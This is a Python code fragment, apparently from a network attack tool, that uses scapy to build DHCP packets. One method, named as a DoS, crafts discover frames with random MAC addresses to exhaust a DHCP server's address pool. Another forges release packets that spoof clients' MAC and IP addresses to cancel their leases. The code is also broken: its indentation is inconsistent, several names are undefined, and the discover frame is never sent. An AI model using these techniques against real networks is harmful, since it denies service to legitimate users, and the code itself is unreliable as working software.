import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class DHCPModel:

    env = None;

    def __init__(self,Environement):
        self.env = Environement;

    def DHCP_Discover_Dos(self):
    	scap = self.env.getImport('scapy.all')
        scap.conf.verb = 0

    	tramedhcp = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])


    def DHCP_Release(self):
    	myxid=random.randint(1, 900000000)
        
        for cmac,cip in nodes.iteritems():
            dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
            sendPacket(dhcp_release)
            if conf.verb: LOG(type="DEBUG", message= "%r"%dhcp_release )